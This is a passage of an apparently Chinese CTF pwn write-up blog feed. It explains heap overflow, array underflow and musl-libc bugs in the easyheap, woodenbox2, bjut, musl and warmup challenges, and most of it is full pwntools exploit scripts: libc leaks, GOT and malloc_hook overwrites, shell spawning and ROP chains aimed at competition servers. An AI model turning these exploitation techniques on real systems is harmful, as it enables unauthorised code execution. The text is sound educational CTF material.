fail直接返回，然后申请一个0x10的堆块就可以实现堆块重叠。通过edit前俩次的堆块来覆盖最后一次malloc的堆块的ptr指针来指向chunk_list的位置，然后伪造chunk结构指向got，并且show一下就可以知道libc了，然后修改free_got为system然后free一个内容为/bin/sh的堆块就可以开启shell。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;tmux&apos;, &apos;sp&apos;, &apos;-h&apos;, &apos;-l&apos;, &apos;110&apos;]</span><br><span class="line">if sys.argv[1]==&quot;l&quot;:</span><br><span class="line">io=process(&apos;./easyheap&apos;)</span><br><span class="line">lib=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">else:</span><br><span class="line">io=remote(&apos;121.36.209.145&apos;,9997)</span><br><span class="line">lib=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">elf=ELF(&apos;./easyheap&apos;)</span><br><span class="line"></span><br><span class="line">def choice(idx):</span><br><span class="line">    io.sendlineafter(&apos;Your choice:\n&apos;, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(size, content):</span><br><span class="line">    choice(1)</span><br><span class="line">    io.sendafter(&apos;this message?\n&apos;, str(size))</span><br><span class="line">    if size&lt; 0x400:</span><br><span class="line">    io.sendafter(&apos;content of the message?\n&apos;, content)</span><br><span class="line"></span><br><span class="line">def dele(idx):</span><br><span class="line">choice(2)</span><br><span class="line">io.sendlineafter(&apos;deleted?\n&apos;,str(idx))</span><br><span class="line"></span><br><span class="line">def edit(idx, content):</span><br><span class="line">    choice(3)</span><br><span class="line">    io.sendlineafter(&apos;modified?\n&apos;,str(idx))</span><br><span class="line">    io.sendafter(&apos;message?\n&apos;, content)</span><br><span class="line"></span><br><span class="line"># ------------------------------------------------</span><br><span class="line">onegadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]</span><br><span class="line">chunk_list=0x6020C0</span><br><span class="line"># ------------------------------------------------</span><br><span class="line">add(0x18,0x18 * &quot;\x10&quot;) #0</span><br><span class="line">add(0x18,0x18 * &quot;\x11&quot;) #1</span><br><span class="line">dele(0)</span><br><span class="line">add(0x500,&apos;&apos;)</span><br><span class="line">dele(1)</span><br><span class="line">add(0x500,&apos;&apos;)</span><br><span class="line"></span><br><span class="line">add(0x18,0x18 * &apos;\x12&apos;) #2</span><br><span class="line">edit(1,p64(0) + p64(0x18) + p64(chunk_list))</span><br><span class="line">edit(2,p64(chunk_list + 8) + p64(chunk_list))</span><br><span class="line">edit(0,p64(chunk_list + 8) + p64(chunk_list) + p64(chunk_list + 0x18) + p64(elf.got[&apos;free&apos;]) + p64(elf.got[&apos;__libc_start_main&apos;]) + p64(chunk_list + 0x30) + p64(elf.got[&apos;free&apos;]) + p64(elf.got[&apos;free&apos;]))</span><br><span class="line"></span><br><span class="line">edit(2,p64(elf.plt[&apos;puts&apos;]))</span><br><span class="line">dele(4)</span><br><span class="line">__libc_start_main = u64(io.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&apos;\x00&apos;))</span><br><span class="line">libc = __libc_start_main - lib.symbols[b&apos;__libc_start_main&apos;]</span><br><span class="line">lib.address = libc</span><br><span class="line">system = lib.symbols[&apos;system&apos;]</span><br><span class="line">binsh = lib.search(&quot;/bin/sh\x00&quot;).next()</span><br><span class="line">__dele_hook = lib.symbols[&apos;__free_hook&apos;]</span><br><span class="line">__malloc_hook = lib.symbols[&apos;__malloc_hook&apos;]</span><br><span class="line">__realloc_hook = lib.symbols[&apos;__realloc_hook&apos;]</span><br><span class="line"></span><br><span class="line">edit(5,p64(system))</span><br><span class="line">edit(0,p64(chunk_list + 8) + p64(binsh))</span><br><span class="line">dele(0)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="woodenbox2"><a href="#woodenbox2" class="headerlink" title="woodenbox2"></a>woodenbox2</h2><p>got表可写，其余保护全开</p><h3 id="漏洞点-1"><a href="#漏洞点-1" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>change_item()函数里面没有对size做限制，堆溢出。</p><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>题目难点在于没有输出功能，需要打io_file泄露libc基址。然后fastbin attack 打malloc_hook,这里onegadget失效，用realloc 调整偏移即可。<br>iofile泄露原理可参考EX师傅博客<a href="http://blog.eonew.cn/archives/1190" target="_blank" rel="noopener">http://blog.eonew.cn/archives/1190</a></p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><p>成功率 16分之一<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;tmux&apos;, &apos;sp&apos;, &apos;-h&apos;, &apos;-l&apos;, &apos;110&apos;]</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">    try:</span><br><span class="line">        if sys.argv[1]==&quot;l&quot;:</span><br><span class="line">        io=process(&apos;./woodenbox2&apos;)</span><br><span class="line">        libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">        else:</span><br><span class="line">        io=remote(&apos;121.36.215.224&apos;,9998)</span><br><span class="line">        libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">        elf=ELF(&apos;./woodenbox2&apos;)</span><br><span class="line"></span><br><span class="line">        def choice(idx):</span><br><span class="line">            io.sendlineafter(&apos;Your choice:&apos;, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        def add(size, content):</span><br><span class="line">            choice(1)</span><br><span class="line">            io.sendlineafter(&apos;:&apos;, str(size))</span><br><span class="line">            io.sendafter(&apos;:&apos;, content)</span><br><span class="line"></span><br><span class="line">        def free(idx):</span><br><span class="line">        choice(3)</span><br><span class="line">        io.sendlineafter(&apos;:&apos;,str(idx))</span><br><span class="line"></span><br><span class="line">        def edit(idx,size, content):</span><br><span class="line">            choice(2)</span><br><span class="line">            io.sendlineafter(&apos;:&apos;,str(idx))</span><br><span class="line">            io.sendlineafter(&apos;:&apos;,str(size))</span><br><span class="line">            io.sendafter(&apos;:&apos;, content)</span><br><span class="line"></span><br><span class="line">        # ------------------------------------------------</span><br><span class="line">        iofile_off = [0x25dd,0xf5eb] #_IO_2_1_stderr_+157</span><br><span class="line">        onegadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]</span><br><span class="line"></span><br><span class="line">        # ------------------------------------------------</span><br><span class="line"></span><br><span class="line">        add(0x20,&apos;aaaa&apos;)#0</span><br><span class="line">        add(0x40,&apos;aaaa&apos;)#1</span><br><span class="line">        add(0x60,&apos;aaaa&apos;)#2</span><br><span class="line">        add(0xa0,&apos;aaaa&apos;)#3</span><br><span class="line"></span><br><span class="line">        edit(0,0x40,&apos;a&apos;*0x20+p64(0)+p64(0xc1))</span><br><span class="line">        free(1) #1</span><br><span class="line">        free(1) #2</span><br><span class="line">        add(0x40,&apos;bbbb&apos;) #0</span><br><span class="line">        edit(0,0x60,&apos;a&apos;*0x40+p64(0)+p64(0x71)+p16(iofile_off[0]))</span><br><span class="line">        add(0x60,&apos;aaaa&apos;) # 2</span><br><span class="line">        add(0x60,&apos;aaa&apos;+p64(0)*6+p64(0xfbad1800)+p64(0)*3+&quot;\x00&quot;) #3</span><br><span class="line">        io.recv(0x40)</span><br><span class="line">        leak=u64(io.recv(8))</span><br><span class="line">        info(hex(leak))</span><br><span class="line">        libc.address = leak-(0x7f35bc64a600-0x7f35bc285000)</span><br><span class="line">        log.success(hex(libc.address))</span><br><span class="line">        malloc_hook = libc.sym[&apos;__malloc_hook&apos;]</span><br><span class="line">        free_hook = libc.sym[&apos;__free_hook&apos;]</span><br><span class="line">        one = libc.address+onegadgets[1]</span><br><span class="line">        log.success(hex(malloc_hook))</span><br><span class="line"></span><br><span class="line">        add(0x60,&apos;cccc&apos;)#4</span><br><span class="line">        add(0x60,&apos;dddd&apos;)#5</span><br><span class="line">        free(5)</span><br><span class="line">        edit(0,0x100,0xa0*&apos;\x17&apos;+p64(0)+p64(0x71)+p64(malloc_hook-0x23))</span><br><span class="line">        add(0x60,&apos;bbbb&apos;)</span><br><span class="line">        add(0x60,&apos;d&apos;*0xb+p64(one)+p64(libc.symbols[&quot;realloc&quot;]+13))</span><br><span class="line">        choice(1)</span><br><span class="line">        io.sendlineafter(&apos;:&apos;, str(60))</span><br><span class="line">        io.interactive()</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(e)</span><br><span class="line">io.close()</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure></p><h2 id="bjut"><a href="#bjut" class="headerlink" title="bjut"></a>bjut</h2><p>got表可写，pie没开</p><h3 id="漏洞点-2"><a href="#漏洞点-2" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>show 和 edit功能，可以输入负数，造成数组上溢。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 edit()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [rsp+4h] [rbp-Ch]</span><br><span class="line">  unsigned __int64 v2; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(0x28u);</span><br><span class="line">  puts(&quot;The index of your hw:&quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%d&quot;, &amp;v1);</span><br><span class="line">  if ( v1 &lt;= 15 &amp;&amp; qword_404140[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Input your hw:&quot;);</span><br><span class="line">    read(0, qword_404140[v1], dword_4040E0[v1]);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;out of range!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readfsqword(0x28u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p>通过数组上溢泄露free_got内容，然后修改 free_got为system，然后释放/bin/sh的堆块</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><h2 id="musl"><a href="#musl" class="headerlink" title="musl"></a>musl</h2><p>做这个题的时候当时是蒙的，使用的是musl libc跟平时的glibc有很大差异。其中最大的差异是muls不支持延迟绑定，没有 malloc_hook等<br>具体参考 <a href="https://my.oschina.net/u/2306127/blog/1592004" target="_blank" rel="noopener">https://my.oschina.net/u/2306127/blog/1592004</a></p><h3 id="漏洞点-3"><a href="#漏洞点-3" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>add功能有一次堆溢出的机会</p><h3 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h3><p>溢出修改size然后free造成overlapping<br>free时检查了in_use和下一个chunk的prev_size，提前伪造好prev_size<br>overlapping后再取出来，可以uaf，free chunk的链表头部在libc，uaf之后show泄露libc地址，然后edit把fd和bk改为0x602030，利用双向链表写fd bk的操作把一个堆地址写入0x602040，将heap_store劫持到堆上，实现任意地址读写<br>show和edit的次数有限制，但是可以通过任意地址读写覆盖计数器<br>got plt都不可写，没有hook<br>可以通过任意地址读写改写栈，getshell<br>利用任意地址读，读libc中的environ泄露栈地址，算出栈顶地址，然后利用任意地址写覆盖返回地址</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;tmux&apos;, &apos;sp&apos;, &apos;-h&apos;, &apos;-l&apos;, &apos;110&apos;]</span><br><span class="line">if sys.argv[1]==&quot;l&quot;:</span><br><span class="line">r=process([&apos;./libc.so&apos;,&apos;./carbon&apos;])</span><br><span class="line">libc=ELF(&apos;libc.so&apos;)</span><br><span class="line">else:</span><br><span class="line">r=remote(&apos;119.3.158.103&apos;,19008)</span><br><span class="line">libc=ELF(&apos;libc.so&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(size,data):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;1&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your prefer size? &gt;&apos;)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(&apos;Are you a believer? &gt;&apos;)</span><br><span class="line">    r.sendline(&apos;wdnmd&apos;)</span><br><span class="line">    r.recvuntil(&apos;Say hello to your new sleeve &gt;&apos;)</span><br><span class="line">    r.sendline(data)</span><br><span class="line"></span><br><span class="line">def gg_add(size,data):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;1&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your prefer size? &gt;&apos;)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(&apos;Are you a believer? &gt;&apos;)</span><br><span class="line">    r.sendline(&apos;Y\x00&apos;)</span><br><span class="line">    r.recvuntil(&apos;Say hello to your new sleeve &gt;&apos;)</span><br><span class="line">    r.sendline(data)</span><br><span class="line"></span><br><span class="line">def free(index):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;2&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your sleeve ID? &gt;&apos;)</span><br><span class="line">    r.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def edit(index,data):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;3&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your sleeve ID? &gt;&apos;)</span><br><span class="line">    r.sendline(str(index))</span><br><span class="line">    sleep(0.5)</span><br><span class="line">    r.sendline(data)</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;4&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your sleeve ID? &gt;&apos;)</span><br><span class="line">    r.sendline(str(index))</span><br><span class="line"></span><br><span class="line">heap_store = 0x602030</span><br><span class="line">#add-symbol-file libc.so 0x8000000</span><br><span class="line">#x/64gx 0x82953b0</span><br><span class="line">#x/20gx 0x00007fffff7e0000</span><br><span class="line">add(0x10,&apos;gg&apos;)#0</span><br><span class="line">add(0x30,&apos;gg&apos;)#1</span><br><span class="line">add(0x50,p64(0)*6+p64(0x81)+p64(0xa1))#2</span><br><span class="line">add(0x40,&apos;gg&apos;)#3</span><br><span class="line">add(0x20,&apos;gg&apos;)#4</span><br><span class="line">add(0x20,p64(0x40)+p64(heap_store))#5</span><br><span class="line"></span><br><span class="line">free(0)</span><br><span class="line"></span><br><span class="line">gg_add(0x10,&apos;a&apos;*0x10+p64(0x21)+p64(0x81))#0</span><br><span class="line">free(1)</span><br><span class="line"></span><br><span class="line">add(0x30,&apos;gg&apos;)#1</span><br><span class="line">add(0x30,&apos;gg&apos;)#2 6</span><br><span class="line"></span><br><span class="line">free(2)</span><br><span class="line">show(6)</span><br><span class="line">leak = u64(r.recvuntil(&apos;Done.&apos;,drop=True).ljust(8,&apos;\x00&apos;))</span><br><span class="line">info(hex(leak))</span><br><span class="line">gdb.attach(r)</span><br><span class="line">pause()</span><br><span class="line">libc_base = leak-0x292ad8</span><br><span class="line">log.success(hex(libc_base))</span><br><span class="line">system = libc_base+libc.sym[&apos;system&apos;]</span><br><span class="line">edit(6,p64(heap_store)*2)</span><br><span class="line">free(4)</span><br><span class="line"></span><br><span class="line">add(0x30,p64(heap_store))#pwn</span><br><span class="line">environ = libc_base+0x294FD8</span><br><span class="line">log.success(hex(environ))</span><br><span class="line"></span><br><span class="line">add(0x60,p64(0x71)+p64(environ)+p64(0x71)+p64(libc_base+0x8295570-0x8000000))# environ 9 </span><br><span class="line">edit(5,p64(0))</span><br><span class="line">show(9)</span><br><span class="line">leak = u64(r.recvuntil(&apos;Done.&apos;,drop=True).ljust(8,&apos;\x00&apos;))</span><br><span class="line">stack_rsp = leak-0x118</span><br><span class="line">log.success(hex(stack_rsp))</span><br><span class="line">#gg_stack = 0x7ffffffee638</span><br><span class="line">#print(hex(gg_stack-stack_rsp))</span><br><span class="line">gg_stack = 0xa0+stack_rsp</span><br><span class="line">binsh = libc.search(&apos;/bin/sh\x00&apos;).next()+libc_base</span><br><span class="line">edit(10,p64(0x71)+p64(gg_stack)+&apos;/bin/sh&apos;.ljust(8,&apos;\x00&apos;)+p64(0)+p64(0x41)+p64(binsh))</span><br><span class="line">edit(5,p64(0))</span><br><span class="line">#show(12) test libc_addr</span><br><span class="line">pause()</span><br><span class="line">menu = 0x400c2f</span><br><span class="line">flag = libc_base+0x8295580-0x8000000</span><br><span class="line">pop_rdi_ret = libc_base+0x14862</span><br><span class="line">pop_rsi_ret = libc_base+0x1c237</span><br><span class="line">pop_rdx_ret = libc_base+0x1b92</span><br><span class="line"></span><br><span class="line">puts_addr = libc_base+libc.sym[&apos;puts&apos;]</span><br><span class="line">#edit(10,p64(menu)*10)</span><br><span class="line">edit(10,p64(menu)+p64(pop_rdi_ret)+p64(flag)+p64(system)+p64(menu))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;easyheap&quot;&gt;&lt;a href=&quot;#easyheap&quot; class=&quot;headerlink&quot; title=&quot;easyheap&quot;&gt;&lt;/a&gt;easyheap&lt;/h2&gt;&lt;p&gt;程序没开PIE，got表可写&lt;/p&gt;
&lt;h3 id=&quot;漏洞点&quot;&gt;&lt;a href=&quot;#漏洞点&quot;
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>V&amp;N招新赛writeup</title>
    <link href="https://nocbtm.github.io/2020/03/02/V&amp;N%E6%8B%9B%E6%96%B0%E8%B5%9Bwriteup/"/>
    <id>https://nocbtm.github.io/2020/03/02/V&amp;N招新赛writeup/</id>
    <published>2020-03-02T08:47:00.000Z</published>
    <updated>2020-04-23T04:00:50.792Z</updated>
    
    <content type="html"><![CDATA[<h1 id="V-amp-N招新赛writeup"><a href="#V-amp-N招新赛writeup" class="headerlink" title="V&amp;N招新赛writeup"></a>V&amp;N招新赛writeup</h1><p>参考链接:<a href="https://www.lhyerror404.cn/2020/03/01/vn-%e8%80%83%e6%a0%b8%e8%b5%9b-writeup/" target="_blank" rel="noopener">https://www.lhyerror404.cn/2020/03/01/vn-%e8%80%83%e6%a0%b8%e8%b5%9b-writeup/</a></p><h2 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h2><p>题目首先给了puts函数的地址，可得出libc基址，比赛的时候老想着用栈迁移，但stack_addr是随机的，难度比较大。赛后看了小蓝师傅的博客，又学到了新姿势，返回地址覆盖成ret之后，执行两次ret，刚好返回到第一次输入的地方。然后进行ROP，这题用了prtctl函数把execve禁了，可以用open(flag),read(flag,libc_addr+0x3C6500,0x40),write(1,flag,0x40)获取到flag</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./vn_pwn_warmup'</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(<span class="string">'vn.node3.buuoj.cn'</span>,<span class="number">52275</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">'./vn_pwn_warmup'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"gift: 0x"</span>)</span><br><span class="line"></span><br><span class="line">puts_addr=int(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">info(hex(puts_addr))</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">libc_addr=puts_addr-libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">info(hex(libc_addr))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">'Input something: '</span>)</span><br><span class="line">pop_rdi=<span class="number">0x21102</span></span><br><span class="line">pop_rsi=<span class="number">0x202e8</span></span><br><span class="line">pop_rax=<span class="number">0x33544</span></span><br><span class="line">pop_rdx=<span class="number">0x1b92</span></span><br><span class="line">syscall_ret=<span class="number">0xbc375</span></span><br><span class="line">ret=<span class="number">0x937</span></span><br><span class="line">payload = p64(libc_addr+pop_rdi)+p64(<span class="number">0</span>)+p64(libc_addr+pop_rsi)+p64(libc_addr+<span class="number">0x3C6500</span>)+p64(libc_addr+pop_rdx)+p64(<span class="number">0x40</span>)+p64(libc_addr+libc.sym[<span class="string">'read'</span>])</span><br><span class="line">payload += p64(libc_addr+pop_rdi)+p64(libc_addr+<span class="number">0x3C6500</span>)+p64(libc_addr+pop_rsi)+p64(<span class="number">0</span>)+p64(libc_addr+libc.sym[<span class="string">'open'</span>])</span><br><span class="line">payload += p64(libc_addr+pop_rdi)+p64(<span class="number">3</span>)+p64(libc_addr+pop_rsi)+p64(libc_addr+<span class="number">0x3C6600</span>)+p64(libc_addr+pop_rdx)+p64(<span class="number">0x40</span>)+p64(libc_addr+libc.sym[<span class="string">'read'</span>])</span><br><span class="line">payload += p64(libc_addr+pop_rdi)+p64(<span class="number">1</span>)+p64(libc_addr+pop_rsi)+p64(libc_addr+<span class="number">0x3C6600</span>)+p64(libc_addr+pop_rdx)+p64(<span 